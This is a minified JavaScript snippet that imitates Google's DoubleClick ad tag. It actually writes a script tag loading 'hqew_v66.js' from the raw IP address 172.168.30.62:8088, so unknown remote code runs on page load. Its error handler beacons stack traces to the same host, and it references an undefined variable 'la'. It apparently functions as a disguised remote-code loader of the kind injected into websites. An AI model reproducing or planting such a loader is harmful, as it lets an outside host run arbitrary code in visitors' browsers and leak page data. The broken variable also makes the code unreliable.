(function () {
    try {
        d = window;
        d.dcmads = d.dcmads || {};
        d.dcmads.startTime = (new Date).getTime();
        d.dcmads.G = 66;
        var sa = "hqew_v" + d.dcmads.G + ".js",
            I = d.document,
            J = I.currentScript || Array.from(I.getElementsByTagName("script")).pop();
        E = (0 == (J && J.src || "").indexOf("http:") ? "http:" : "https:") + "//172.168.30.62:8088/dcm/" + sa;
        d.document.write('<script src="' + E + '">\x3c/script>')
    } catch (a) {
        if (.01 > Math.random()) {
            var T = "";
            try {
                var U, V = a.toString();
                a.name && -1 == V.indexOf(a.name) && (V += ": " + a.name);
                a.message &&
                -1 == V.indexOf(a.message) && (V += ": " + a.message);
                if (a.stack) {
                    var W = a.stack, X = V;
                    try {
                        -1 == W.indexOf(X) && (W = X + "\n" + W);
                        for (var Y; W != Y;) Y = W, W = W.replace(/((https?:\/..*\/)[^\/:]*:\d+(?:.|\n)*)\2/, "$1");
                        V = W.replace(/\n */g, "\n")
                    } catch (b) {
                        V = X
                    }
                }
                U = V;
                U = U.substring(0, 1024);
                T = encodeURIComponent(U)
            } catch (b) {
                T = "extr"
            }
            var Z = d.dcmads.eids, ua = document.createElement("img");
            ua.src = la + "//172.168.30.62:8088/pagead/gen_204?id=dcmads-err&ver=184&context=554" + ((Z ? "&eids=" + Z : "") + "&msg=" + T);
            (d.hqew_image_requests =
                d.hqew_image_requests || []).push(ua)
        }
    }
}).call(this);
